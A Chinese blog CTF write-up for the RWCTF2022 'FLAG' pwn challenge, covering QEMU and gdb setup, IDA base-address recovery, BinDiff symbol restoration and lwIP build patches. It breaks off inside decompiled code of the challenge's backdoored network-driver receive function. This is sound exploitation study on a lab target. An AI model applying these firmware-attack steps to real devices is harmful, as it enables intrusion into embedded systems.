<!DOCTYPE html>


<html lang="zh-CN">


<head>
  <meta charset="utf-8" />
   
  <meta name="keywords" content="RWCTF,漏洞挖掘, 调试, 代码, 计算机科学, Kiprey, Blog, 二进制，信息安全" />
   
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <title>
    RWCTF2022 Pwn 笔记2 - FLAG Writeup |  Kiprey&#39;s Blog
  </title>
  <meta name="generator" content="hexo-theme-ayer">
  
  <link rel="shortcut icon" href="/favicon.ico" />
  
  
<link rel="stylesheet" href="/dist/main.css">

  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
  
<link rel="stylesheet" href="/css/custom.css">

  
  <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
  
  

  
<script>
var _hmt = _hmt || [];
(function() {
	var hm = document.createElement("script");
	hm.src = "https://hm.baidu.com/hm.js?acff2772e1f74a625e1e26c280afa6c2";
	var s = document.getElementsByTagName("script")[0]; 
	s.parentNode.insertBefore(hm, s);
})();
</script>


<link rel="alternate" href="/atom.xml" title="Kiprey's Blog" type="application/atom+xml">
</head>

</html>

<body>
  <div id="app">
    
      
      <canvas width="1777" height="841"
        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
      
    <main class="content on">
      <section class="outer">
  <article
  id="post-rwctf2022_flag"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
  RWCTF2022 Pwn 笔记2 - FLAG Writeup
</h1>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2022/01/rwctf2022_flag/" class="article-date">
  <time datetime="2022-01-30T16:00:00.000Z" itemprop="datePublished">2022-01-31</time>
</a>   
<div class="word_count">
    <span class="post-time">
        <span class="post-meta-item-icon">
            <i class="ri-quill-pen-line"></i>
            <span class="post-meta-item-text"> 字数统计:</span>
            <span class="post-count">8.6k</span>
        </span>
    </span>

    <span class="post-time">
        &nbsp; | &nbsp;
        <span class="post-meta-item-icon">
            <i class="ri-book-open-line"></i>
            <span class="post-meta-item-text"> 阅读时长≈</span>
            <span class="post-count">39 分钟</span>
        </span>
    </span>
</div>
 
    </div>
      
    <div class="tocbot"></div>




  
    <div class="article-entry" itemprop="articleBody">
       
  <h2 id="简介">简介</h2>
<p>这里是复盘 RWCTF2022 中 FLAG 题时所写下的一些笔记。</p>
<p>由于这题较为复杂，因此需要单独开一个博文来记录。</p>
<blockquote>
<p>联合作者：sakura</p>
</blockquote>
<a id="more"></a>
<h2 id="一、FLAG-小叙">一、FLAG 小叙</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">FreeRTOS+LwIP+ARM+GoAhead</span><br><span class="line">I don&#39;t want another backdoor ctf. So I have to say: &quot;There is a backdoor in challange&quot;</span><br><span class="line">The default account in attachment is admin:admin</span><br><span class="line">nc 8.210.44.156 31337</span><br><span class="line">attachment</span><br><span class="line"></span><br><span class="line">Pwn, difficulty:normal</span><br><span class="line">Hint: flag.bin has a backdoor&#x2F;bugdoor and you&#39;re supposed to take over it. The flag is not embedded in the binary and will be made available to the appliance via network at runtime, see docker-compose.yml in attachment for details.</span><br></pre></td></tr></table></figure>
<p>这一题是多个部件组成的一个二进制文件，其中</p>
<ul>
<li><a href="https://www.freertos.org/" target="_blank" rel="noopener">FreeRTOS</a>：轻量级实时操作系统。
<ul>
<li>无内核，所有任务运行在实模式，可以执行特权指令</li>
<li>业务逻辑与内核代码一同编译成单个二进制文件，因此无 NX、PIE、ASLR 等。</li>
<li>无保护模式，因此执行 shellcode 后需要保证 OS 不崩溃。</li>
</ul>
</li>
<li><a href="http://savannah.nongnu.org/projects/lwip/" target="_blank" rel="noopener">LwIP</a>：轻量级 TCP/IP 实现，适用于资源较少的轻量级嵌入式系统</li>
<li>ARM：ARM 32 little-endian 架构</li>
<li><a href="https://github.com/embedthis/goahead" target="_blank" rel="noopener">GoAhead</a>：一个嵌入式微型网页服务</li>
</ul>
<p>题目给了一些附件，其中有用的主要有：</p>
<ul>
<li>
<p><code>flag.py</code>：docker 服务会在 <strong>每30s</strong> 向接口 <code>http://localhost:5555/action/backdoor</code> 发送一次 <strong>GET</strong> 请求，如果：</p>
<ul>
<li>请求返回 <code>{'status' : 'success'}</code></li>
<li>请求返回 HTTP 状态码为 <strong>200</strong></li>
</ul>
<p>则 <a href="http://flag.py" target="_blank" rel="noopener">flag.py</a> 将会加载 flag 并且以 <code>{&quot;flag&quot;: flag}</code> 的形式发送给该 backdoor。</p>
<p>很明显，我们需要 pwn 掉这个 binary，<strong>伪造一个 backdoor 服务、尝试接收传来的 flag 并输出给用户</strong>。</p>
</li>
<li>
<p><code>flag.bin</code>：题目的二进制附件，这个暂且略过不表。</p>
</li>
<li>
<p><code>dockerfile</code>： 其中记录了 qemu 的启动参数：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-arm \</span><br><span class="line">  -m 64 \</span><br><span class="line">  -nographic \</span><br><span class="line">  -machine vexpress-a9 \</span><br><span class="line">  -net user,hostfwd=tcp::5555-:80 \</span><br><span class="line">  -net nic \</span><br><span class="line">  -kernel /mnt/flag.bin</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>把题目启动之后，访问 <code>localhost:5555</code>，即可访问到题目 Web 服务的登录界面：</p>
<p><img src="/2022/01/rwctf2022_flag/image-20220128144627376.png" alt="image-20220128144627376"></p>
<p>接下来输入账号<code>admin</code>、密码<code>admin</code>，进入到一个普通的小游戏页面，看上去没什么特别的，估计不是重点；直接访问 backdoor 接口，返回 <code>404</code> 界面。</p>
<p>如果想退出 QEMU, 则在启动 qemu 的终端里，先键入 <code>ctrl + a</code>，之后<strong>抬起这两个键</strong>，并接着按下 <code>x</code> 即可退出。</p>
<h2 id="二、FLAG-环境搭建">二、FLAG 环境搭建</h2>
<ul>
<li>
<p>下载并安装 IDA BinDiff 插件 - <a href="https://www.zynamics.com/software.html" target="_blank" rel="noopener">download link (ladder needed)</a></p>
<p>网上的教程里描述了安装该插件时需要指定 IDA 安装路径，但是本人实测安装时并没有要求指定 IDA 安装路径，但是 IDA 仍然可以识别并加载 BinDiff 插件。</p>
<p>BinDiff 将用于恢复 GoAhead 符号。</p>
</li>
<li>
<p>下载多架构 gdb:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gdb-multiarch</span><br></pre></td></tr></table></figure>
<p>调试 kernel 的方式：</p>
<ul>
<li>在 qemu 启动参数后加上 <code>-gdb tcp::1234</code></li>
<li>然后使用 <code>gdb-multiarch</code> 执行 <code>target remote localhost:1234</code> 连接 qemu</li>
</ul>
</li>
</ul>
<h2 id="三、确定内核加载基地址">三、确定内核加载基地址</h2>
<p>如果我们直接把题目内核拖入 IDA 中，IDA 是无法识别的，因此需要确定并指定加载基地址。</p>
<blockquote>
<p>基地址的确定本身就是一件比较难的事情，需要逻辑推理+大胆猜测。</p>
</blockquote>
<p>我们先将 flag.bin 拖入 <strong>32 位</strong> IDA（注意是32位） ，指定 Processor Type 为 ARM Little-endian：</p>
<p><img src="/2022/01/rwctf2022_flag/image-20220128162324429.png" alt="image-20220128162324429"></p>
<p>之后对前几条指令执行 make code 操作（快捷键 p 或者 c），会生成一系列的内存地址加载指令：</p>
<p><img src="/2022/01/rwctf2022_flag/image-20220128164704594.png" alt="image-20220128164704594"></p>
<p>注意到这几条访问内存地址为 <code>0x6001XXXX</code> 的指令，结合 gdb 调试断下的指令位置为 <code>0x60010658</code>：</p>
<p><img src="/2022/01/rwctf2022_flag/image-20220128164823570.png" alt="image-20220128164823570"></p>
<p>因此我们可以大胆推断<strong>基地址应该为 0x60010000</strong>。</p>
<p>加载基地址确定好后，就可以为 IDA 重设基地址。</p>
<p><img src="/2022/01/rwctf2022_flag/image-20220128151550841.png" alt="image-20220128151550841"></p>
<p>之后 IDA 便可以分析出<strong>部分</strong>代码等：</p>
<p><img src="/2022/01/rwctf2022_flag/image-20220128165114508.png" alt="image-20220128165114508"></p>
<p>接下来还需要全选IDA中的代码+数据，并右键点击 Analyze 进行完整分析，等待它分析完成。</p>
<p><img src="/2022/01/rwctf2022_flag/image-20220128175327783.png" alt="image-20220128175327783"></p>
<p>但是这里的分析不会完全的进行分析，因此还需要使用这个 <a href="https://github.com/zh-explorer/ida_script/blob/master/firmware_fix.py" target="_blank" rel="noopener">firmware-fix</a> 脚本来进行二次分析，执行自动创建函数体、字符串等操作。（确定了代码区末尾地址为 <code>0x6006F544</code>）</p>
<blockquote>
<p>注意：该脚本无法区分出不同的段，因此在这一题中效果一般般… 会把一些明显是数据的东西恢复成函数。</p>
<p>感兴趣可以看看源码，不长。</p>
</blockquote>
<p>执行完成上面的步骤后，仍然有相当一部分的字符串无法使用交叉引用，暂且先这样。</p>
<p>需要注意的是，<strong>IDA 的反编译引擎 Hex-Ray 需要参考 segment 的信息来生成 C 代码（例如RWX权限情况）</strong>，因此我们最好恢复一下。最简单的方式就是把当前这个 ROM 段权限直接改成 RWX，不过本人根据恢复结果创建了一个 text 段。</p>
<p><img src="/2022/01/rwctf2022_flag/image-20220128174408119.png" alt="image-20220128174408119"></p>
<h2 id="四、恢复符号">四、恢复符号</h2>
<h3 id="a-GoAhead-符号">a. GoAhead 符号</h3>
<p>现在我们可以尝试恢复 GoAhead 符号。首先通过字符串搜索 + 交叉引用找到 GoAhead 相关的函数：</p>
<blockquote>
<p>注意：如果该函数的反汇编无法直接 F5, 则找到该地址的<strong>上一个函数</strong>的<strong>末尾地址</strong>，并右键点击 Create Function ，之后再反编译即可。</p>
</blockquote>
<p><img src="/2022/01/rwctf2022_flag/image-20220128175919035.png" alt="image-20220128175919035"></p>
<p>该函数最后一行有一个字符串说明了 GoAHead 的版本号，为 <code>5.1.5</code>，因此我们可以立即编译一个 5.1.5 的 GoAHead 二进制文件：</p>
<blockquote>
<p>这里可以指定使用 arm32 编译器来生成 <a href="http://libgo.so" target="_blank" rel="noopener">libgo.so</a>，这样 bindiff 效果会更好。</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/embedthis/goahead</span><br><span class="line"><span class="built_in">cd</span> goahead</span><br><span class="line">git checkout v5.1.5</span><br><span class="line">make</span><br><span class="line">file build/linux-x64-default/bin/libgo.so <span class="comment"># 目标文件</span></span><br></pre></td></tr></table></figure>
<p>将该 <a href="http://libgo.so" target="_blank" rel="noopener">libgo.so</a> 目标文件拖到 IDA 里，生成 libgo.idb 数据库文件。之后在开启 flag.bin 的 IDA 中，使用 BinDiff 插件与 libgo.idb 进行比对。</p>
<p>通过简单的对比，发现 Similarity 大于 0.80 的函数基本上和 <a href="http://libgo.so" target="_blank" rel="noopener">libgo.so</a> 的反编译结果能对上，因此我们可以尝试恢复这部分函数的符号上去：</p>
<blockquote>
<p>注意，BinDiff 可以通过比较基本块关联、反编译代码关联等来进行比较，因此即便用于比较的两个文件是<strong>不同架构</strong>的，该插件仍然可以比较并输出结果。</p>
</blockquote>
<blockquote>
<p>下图是我恢复 similarity &gt; 0.40 的操作，注意最好不要像我这么冒险，恢复相似度非常低的函数。</p>
</blockquote>
<p><img src="/2022/01/rwctf2022_flag/image-20220128181721392.png" alt="image-20220128181721392"></p>
<p>接下来需要恢复 GoAHead 结构体定义：在 <a href="http://libgo.so" target="_blank" rel="noopener">libgo.so</a> 的 IDA 界面中，点击 <code>File -&gt; Produce file -&gt; Create C Header File</code> 将一些结构体定义输出至新的头文件中；之后在 flag.bin IDA 界面中，点击 <code>File -&gt; Load file -&gt; Parse C header file</code> 导入该头文件。</p>
<h3 id="b-lwIP-符号">b. lwIP 符号</h3>
<p>题目在启动时便给了版本号：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lwIP-2.1.3 initialized!</span><br></pre></td></tr></table></figure>
<p>首先下拉代码并编译：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://git.savannah.nongnu.org/git/lwip.git</span><br><span class="line"><span class="built_in">cd</span> lwip</span><br><span class="line">git checkout STABLE-2_1_3_RELEASE</span><br><span class="line">cmake -B build .</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line"><span class="comment"># 安装 ARM 编译器</span></span><br><span class="line">sudo apt-get install gcc-arm-linux-gnueabihf</span><br><span class="line">CC=arm-linux-gnueabihf-gcc make lwipcore lwipallapps</span><br></pre></td></tr></table></figure>
<p>make 时遇到各种头文件缺失问题，首先 down 一个 RTOS 源码下来:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在 lwIP 的同级目录下</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/FreeRTOS/FreeRTOS</span><br><span class="line">git submodule update --init --recursive</span><br></pre></td></tr></table></figure>
<p>之后给 lwIP 打上这个 patch:</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/CMakeLists.txt b/CMakeLists.txt</span><br><span class="line">index f05c0f61..a26752f1 100644</span><br><span class="line"><span class="comment">--- a/CMakeLists.txt</span></span><br><span class="line"><span class="comment">+++ b/CMakeLists.txt</span></span><br><span class="line">@@ -14,6 +14,9 @@ set(CPACK_PACKAGE_VERSION_PATCH "$&#123;LWIP_VERSION_REVISION&#125;")</span><br><span class="line"> set(CPACK_SOURCE_IGNORE_FILES "/build/;$&#123;CPACK_SOURCE_IGNORE_FILES&#125;;.git")</span><br><span class="line"> set(CPACK_SOURCE_PACKAGE_FILE_NAME "lwip-$&#123;LWIP_VERSION_MAJOR&#125;.$&#123;LWIP_VERSION_MINOR&#125;.$&#123;LWIP_VERSION_REVISION&#125;")</span><br><span class="line"> include(CPack)</span><br><span class="line"><span class="addition">+include_directories ("src/include")</span></span><br><span class="line"><span class="addition">+include_directories ("test/unit")</span></span><br><span class="line"><span class="addition">+include_directories ("../FreeRTOS/FreeRTOS/Demo/CORTEX_A9_Zynq_ZC702/RTOSDemo/src/lwIP_Demo/lwIP_port/include")</span></span><br><span class="line"> </span><br><span class="line"> # Target for package generation</span><br><span class="line"> add_custom_target(dist COMMAND $&#123;CMAKE_MAKE_PROGRAM&#125; package_source)</span><br><span class="line">diff --git a/src/include/lwip/arch.h b/src/include/lwip/arch.h</span><br><span class="line">index 58dae33a..6159082f 100644</span><br><span class="line"><span class="comment">--- a/src/include/lwip/arch.h</span></span><br><span class="line"><span class="comment">+++ b/src/include/lwip/arch.h</span></span><br><span class="line">@@ -126,8 +126,8 @@ typedef uint8_t   u8_t;</span><br><span class="line"> typedef int8_t    s8_t;</span><br><span class="line"> typedef uint16_t  u16_t;</span><br><span class="line"> typedef int16_t   s16_t;</span><br><span class="line"><span class="deletion">-typedef uint32_t  u32_t;</span></span><br><span class="line"><span class="deletion">-typedef int32_t   s32_t;</span></span><br><span class="line"><span class="addition">+// typedef uint32_t  u32_t;</span></span><br><span class="line"><span class="addition">+// typedef int32_t   s32_t;</span></span><br><span class="line"> #if LWIP_HAVE_INT64</span><br><span class="line"> typedef uint64_t  u64_t;</span><br><span class="line"> typedef int64_t   s64_t;</span><br><span class="line">diff --git a/src/include/lwip/sockets.h b/src/include/lwip/sockets.h</span><br><span class="line">index d70d36c4..ac17f302 100644</span><br><span class="line"><span class="comment">--- a/src/include/lwip/sockets.h</span></span><br><span class="line"><span class="comment">+++ b/src/include/lwip/sockets.h</span></span><br><span class="line">@@ -108,7 +108,7 @@ struct sockaddr_storage &#123;</span><br><span class="line"> /* If your port already typedef's socklen_t, define SOCKLEN_T_DEFINED</span><br><span class="line">    to prevent this code from redefining it. */</span><br><span class="line"> #if !defined(socklen_t) &amp;&amp; !defined(SOCKLEN_T_DEFINED)</span><br><span class="line"><span class="deletion">-typedef u32_t socklen_t;</span></span><br><span class="line"><span class="addition">+// typedef u32_t socklen_t;</span></span><br><span class="line"> #endif</span><br><span class="line"> </span><br><span class="line"> #if !defined IOV_MAX</span><br><span class="line">@@ -519,10 +519,10 @@ struct pollfd</span><br><span class="line"> #endif</span><br><span class="line"> </span><br><span class="line"> #if LWIP_TIMEVAL_PRIVATE</span><br><span class="line"><span class="deletion">-struct timeval &#123;</span></span><br><span class="line"><span class="deletion">-  long    tv_sec;         /* seconds */</span></span><br><span class="line"><span class="deletion">-  long    tv_usec;        /* and microseconds */</span></span><br><span class="line"><span class="deletion">-&#125;;</span></span><br><span class="line"><span class="addition">+// struct timeval &#123;</span></span><br><span class="line"><span class="addition">+//   long    tv_sec;         /* seconds */</span></span><br><span class="line"><span class="addition">+//   long    tv_usec;        /* and microseconds */</span></span><br><span class="line"><span class="addition">+// &#125;;</span></span><br><span class="line"> #endif /* LWIP_TIMEVAL_PRIVATE */</span><br><span class="line"> </span><br><span class="line"> #define lwip_socket_init() /* Compatibility define, no init needed. */</span><br></pre></td></tr></table></figure>
<p>之后重新执行上述的编译操作即可。</p>
<p>但是这样编译出来的竟然是<strong>静态链接库</strong>，没法拖到 IDA 里分析，因此还需要修改一下 CMakeList 中的东西：</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/Filelists.cmake b/src/Filelists.cmake</span><br><span class="line">index 21d7b490..179f5716 100644</span><br><span class="line"><span class="comment">--- a/src/Filelists.cmake</span></span><br><span class="line"><span class="comment">+++ b/src/Filelists.cmake</span></span><br><span class="line">@@ -268,12 +268,12 @@ else (DOXYGEN_FOUND)</span><br><span class="line"> endif (DOXYGEN_FOUND)</span><br><span class="line"> </span><br><span class="line"> # lwIP libraries</span><br><span class="line"><span class="deletion">-add_library(lwipcore EXCLUDE_FROM_ALL $&#123;lwipnoapps_SRCS&#125;)</span></span><br><span class="line"><span class="addition">+add_library(lwipcore SHARED $&#123;lwipnoapps_SRCS&#125;)</span></span><br><span class="line"> target_compile_options(lwipcore PRIVATE $&#123;LWIP_COMPILER_FLAGS&#125;)</span><br><span class="line"> target_compile_definitions(lwipcore PRIVATE $&#123;LWIP_DEFINITIONS&#125;  $&#123;LWIP_MBEDTLS_DEFINITIONS&#125;)</span><br><span class="line"> target_include_directories(lwipcore PRIVATE $&#123;LWIP_INCLUDE_DIRS&#125; $&#123;LWIP_MBEDTLS_INCLUDE_DIRS&#125;)</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-add_library(lwipallapps EXCLUDE_FROM_ALL $&#123;lwipallapps_SRCS&#125;)</span></span><br><span class="line"><span class="addition">+add_library(lwipallapps SHARED $&#123;lwipallapps_SRCS&#125;)</span></span><br><span class="line"> target_compile_options(lwipallapps PRIVATE $&#123;LWIP_COMPILER_FLAGS&#125;)</span><br><span class="line"> target_compile_definitions(lwipallapps PRIVATE $&#123;LWIP_DEFINITIONS&#125;  $&#123;LWIP_MBEDTLS_DEFINITIONS&#125;)</span><br><span class="line"> target_include_directories(lwipallapps PRIVATE $&#123;LWIP_INCLUDE_DIRS&#125; $&#123;LWIP_MBEDTLS_INCLUDE_DIRS&#125;)</span><br></pre></td></tr></table></figure>
<p>然后编译报错，提示 :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/ld: errno: TLS definition <span class="keyword">in</span> /lib/x86_64-linux-gnu/libc.so.6 section .tbss mismatches non-TLS reference <span class="keyword">in</span> CMakeFiles/lwipcore.dir/src/api/if_api.c.o</span><br></pre></td></tr></table></figure>
<p>将某个头文件中的 <code>extern errno</code> 替换掉即可：</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/include/lwip/errno.h b/src/include/lwip/errno.h</span><br><span class="line">index 48d6b539..acd7817f 100644</span><br><span class="line"><span class="comment">--- a/src/include/lwip/errno.h</span></span><br><span class="line"><span class="comment">+++ b/src/include/lwip/errno.h</span></span><br><span class="line">@@ -174,7 +174,8 @@ extern "C" &#123;</span><br><span class="line"> #define  EMEDIUMTYPE    124  /* Wrong medium type */</span><br><span class="line"> </span><br><span class="line"> #ifndef errno</span><br><span class="line"><span class="deletion">-extern int errno;</span></span><br><span class="line"><span class="addition">+// extern int errno;</span></span><br><span class="line"><span class="addition">+#include &lt;errno.h&gt;</span></span><br><span class="line"> #endif</span><br><span class="line"> </span><br><span class="line"> #else /* LWIP_PROVIDE_ERRNO */</span><br></pre></td></tr></table></figure>
<p>成功编译出 .so 动态链接库。之后照着上面的步骤恢复符号即可。</p>
<blockquote>
<p>后来才发现，这里恢复 lwIP 符号的操作并没有什么用处，纯当是踩坑记录了。</p>
</blockquote>
<h2 id="五、漏洞思路">五、漏洞思路</h2>
<p>接下来可以看看字符串表中有哪些有用的信息：</p>
<p><img src="/2022/01/rwctf2022_flag/image-20220128195501667.png" alt="image-20220128195501667"></p>
<p>看上去都很有趣，但是都找不到交叉引用（恢复的还是不够好）。</p>
<p>不过可以<strong>通过全局搜索字符串的地址</strong>来找到引用的地方。</p>
<p><img src="/2022/01/rwctf2022_flag/image-20220128202705045.png" alt="image-20220128202705045"></p>
<p>继续向上交叉引用，找到该函数，可以看到注册了一个 submit 动作，其事件处理例程就是上一个找到的函数。继续交叉引用发现除了注册了 submit 动作以外，还注册了 login 和 logout 动作，不过这两个动作看上去用处不大，暂且忽略不看。</p>
<p><img src="/2022/01/rwctf2022_flag/image-20220128211258805.png" alt="image-20220128211258805"></p>
<p>那如何调用这个 submit 呢？通过字符串搜索可以得出 <code>/web/submit.jst</code> 这个路由路径，因此我们可以通过访问 <code>http://localhost:5555/submit.jst</code> URL 来进入这个页面：</p>
<p><img src="/2022/01/rwctf2022_flag/image-20220128211958598.png" alt="image-20220128211958598"></p>
<p>通过先前的逆向过程和网络抓包可以得知，<strong>GoAHead 会使用到 Session 技术</strong>。因此若我们在该界面提交一串数据后，当我们下一次再访问这个界面，则<strong>先前提交的数据将仍然会显示在这里</strong>。</p>
<p>submit 接口暂时告一段落。根据打题的师傅所说，GoAHead 除了增加 submit 功能以外，其余部分基本没动过。根据我进一步所查询的资料，backdoor 应该是位于 <strong>RT-thread（一个国产 RTOS） 中 lwIP模块 的 smc911x 驱动</strong>中…</p>
<blockquote>
<p>沉思，这个 backdoor 其他师傅们是怎么找出来的…</p>
</blockquote>
<p>这里直接开天眼，backdoor 位于地址 <code>0x6001B024</code> 中（<a href="https://github.com/RT-Thread/rt-thread/blob/master/bsp/qemu-vexpress-a9/drivers/drv_smc911x.c#L447" target="_blank" rel="noopener">smc911x_eth_rx 函数</a>，用于接收数据包），以下是 IDA 反编译+自己简单恢复符号后的结果：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">smc911x_emac_rx_backdoor</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> *v1; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">64</span>]; <span class="comment">// [sp+Ch] [bp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v5[<span class="number">2</span>]; <span class="comment">// [sp+4Ch] [bp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> *v6; <span class="comment">// [sp+54h] [bp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> pktlen; <span class="comment">// [sp+58h] [bp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> status; <span class="comment">// [sp+5Ch] [bp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [sp+60h] [bp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *data; <span class="comment">// [sp+64h] [bp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// [sp+68h] [bp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [sp+6Ch] [bp-10h]</span></span><br><span class="line"></span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  v9 = a1;</span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    rt_assert_handler(byte_600704AC, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)smc911x_reg_read(v9, <span class="number">124</span>) &gt;&gt; <span class="number">16</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    status = smc911x_reg_read(v9, <span class="number">64</span>);</span><br><span class="line">    pktlen = HIWORD(status) &amp; <span class="number">0x3FFF</span>;</span><br><span class="line">    smc911x_reg_write(v9, <span class="number">0x6C</span>, <span class="number">0</span>);</span><br><span class="line">    v11 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(pktlen + <span class="number">3</span>) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    v12 = pbuf_alloc(<span class="number">0</span>, <span class="number">4</span> * v11, <span class="number">0x280</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( v12 )</span><br><span class="line">    &#123;</span><br><span class="line">      data = *(<span class="keyword">int</span> **)(v12 + <span class="number">4</span>);</span><br><span class="line">      <span class="keyword">while</span> ( v11-- )</span><br><span class="line">      &#123;</span><br><span class="line">        v1 = data++;</span><br><span class="line">        *v1 = smc911x_reg_read(v9, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (status &amp; <span class="number">0x8000</span>) != <span class="number">0</span> )</span><br><span class="line">      